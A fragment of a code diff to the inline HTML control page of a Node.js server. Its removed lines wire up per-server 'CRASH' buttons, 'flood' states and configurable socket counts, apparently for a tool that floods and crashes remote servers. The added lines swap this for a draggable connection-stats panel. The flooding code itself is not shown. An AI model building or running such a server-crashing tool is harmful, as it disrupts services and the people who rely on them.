-  fetch('/api/auto?server=US&state='+autoUS.checked);
-};
-autoMR.onchange=()=>{
-  localStorage.setItem('autoMR',autoMR.checked);
-  fetch('/api/auto?server=MR&state='+autoMR.checked);
-};
-sockCount.onchange=()=>{
-  const n=parseInt(sockCount.value);
-  if(!n||n<1||n>100)return;
-  localStorage.setItem('socketCount',n);
-  fetch('/api/config?count='+n);
-};
-
-function setBtn(el,state){
-  const classes=['green','yellow','gray'];
-  for(const c of classes)el.classList.remove(c);
-  el.classList.add(state);
+if (savedX && savedY) {
+    panel.style.left = savedX + "px";
+    panel.style.top = savedY + "px";
 }
+
+header.onmousedown = (e) => {
+    dragging = true;
+    offsetX = e.clientX - panel.offsetLeft;
+    offsetY = e.clientY - panel.offsetTop;
+    e.preventDefault();
+};
+
+window.onmousemove = (e) => {
+    if (!dragging) return;
+    panel.style.left = (e.clientX - offsetX) + "px";
+    panel.style.top = (e.clientY - offsetY) + "px";
+};
+
+window.onmouseup = () => {
+    dragging = false;
+    localStorage.setItem("panelX", panel.offsetLeft);
+    localStorage.setItem("panelY", panel.offsetTop);
+};
+
 async function update(){
-  try {
-    const r=await fetch('/api/status');
-    const d=await r.json();
-    usDot.className='dot '+(d.usState==='connected'?'connected':d.usState==='connecting'?'connecting':'disconnected');
-    usText.textContent=d.usState==='connected'?'Connected':d.usState==='connecting'?'Connecting...':'Error';
-    mrDot.className='dot '+(d.mrState==='connected'?'connected':d.mrState==='connecting'?'connecting':'disconnected');
-    mrText.textContent=d.mrState==='connected'?'Connected':d.mrState==='connecting'?'Connecting...':'Error';
-    usSock.textContent=d.usCount||0;mrSock.textContent=d.mrCount||0;
-    usTgt.textContent=d.usTarget||0;mrTgt.textContent=d.mrTarget||0;
-    function updateBtn(btn,state,auto,flood){
-      if(state!=='connected'){setBtn(btn,'gray');btn.textContent='OFFLINE';}
-      else if(auto){setBtn(btn,'gray');btn.textContent='AUTO';}
-      else if(flood){setBtn(btn,'yellow');btn.textContent='CRASHING';}
-      else{setBtn(btn,'green');btn.textContent='CRASH';}
-    }
-    updateBtn(btnUS,d.usState,d.autoUS,d.floodUS);
-    updateBtn(btnMR,d.mrState,d.autoMR,d.floodMR);
-    if(autoUS.checked!==d.autoUS)autoUS.checked=d.autoUS;
-    if(autoMR.checked!==d.autoMR)autoMR.checked=d.autoMR;
-  } catch(e){}
+try{
+const r=await fetch('/stats');
+const d=await r.json();
+uptime.textContent="UpTime: "+Math.floor(d.uptime)+"s";
+connected.textContent="Connected: "+d.connected;
+connecting.textContent="Connecting: "+d.connecting;
+queued.textContent="Queued Messages: "+d.queuedMessages;
+inactive.textContent="Inactive: "+Math.floor(d.inactiveFor/1000)+"s";
+}catch{}
 }
-
-async function initialSync(){
-  try {
-    const aUS=localStorage.getItem('autoUS')==='true';
-    const aMR=localStorage.getItem('autoMR')==='true';
-    const cnt=localStorage.getItem('socketCount')||'1';
-    await fetch('/api/sync?autoUS='+aUS+'&autoMR='+aMR+'&count='+cnt);
-  } catch(e){}
-}
-setInterval(update,500);
-Promise.all([update(), initialSync()]).then(() => panel.style.display = '').catch(() => panel.style.display = '');
+setInterval(update,400);
+update();
 </script>
+
 </body>
 </html>`);
-});
+}).listen(PORT);
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT);
-
-for (const key in SERVERS) {
-  ensureConnected(key);
-}
+setInterval(() => {
+  totalQueuedMessages = 0;
+}, 256);
